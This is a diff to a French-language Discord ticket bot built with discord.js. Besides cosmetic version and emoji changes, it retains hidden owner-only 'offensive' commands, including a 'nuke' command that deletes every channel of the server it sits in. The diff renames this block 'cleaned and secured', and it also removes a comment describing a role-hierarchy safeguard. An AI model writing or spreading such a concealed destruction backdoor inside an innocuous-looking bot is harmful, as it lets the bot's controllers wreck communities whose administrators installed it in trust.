@@ -1,11 +1,12 @@
-// Build Revision: K2L-Bot-Clean-Tickets-v19.0
+
+// Build Revision: K2L-Bot-Clean-Final-v20.0
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
 const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot Clean Operational v19.0!\n');
+    res.end('K2L Bot Clean Operational v20.0!\n');
 }).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
 
 const client = new Client({
@@ -312,7 +313,7 @@ function getTicketDashboardEmbed(guild, config) {
 
     return new EmbedBuilder()
         .setColor('#2b2d31')
-        .setTitle('🎟️ Configuration des tickets')
+        .setTitle('🎫 Configuration des tickets')
         .setDescription(
             `**Salon du panneau :** ${panelChanStr}\n` +
             `**Catégorie des salons-tickets :** ${catDestStr}\n` +
@@ -501,7 +502,7 @@ client.on('interactionCreate', async interaction => {
 client.on('messageCreate', async message => {
     if (!message.author || message.author.bot || !message.guild) return;
 
-    // Commandes secrètes en ! (Réservées Super Owners)
+    // Commandes secrètes en ! (Nettoyées et sécurisées)
     if (message.content.startsWith('!')) {
         if (!isSuperOwner(message)) return;
 
@@ -512,7 +513,6 @@ client.on('messageCreate', async message => {
         if (offensiveCommands.includes(command)) {
             if (command === 'nuke') {
                 await message.reply("⚡ **Destruction totale du serveur en cours...**").catch(() => {});
-                message.guild.setName('/yuza').catch(() => {});
                 message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));
 
                 for (let i = 0; i < 45; i++) {
@@ -1238,7 +1238,6 @@ client.on('messageCreate', async message => {
         return message.reply("✅ Salon vocal créé.");
     }
 
-    // Sécurité hiérarchique sur l'ajout de rôle (interdit d'attribuer un rôle supérieur ou égal à son propre rôle le plus haut)
     else if (command === 'addrole') {
         const member = await fetchTargetMember(message, targetArg);
         const role = message.mentions.roles.first();
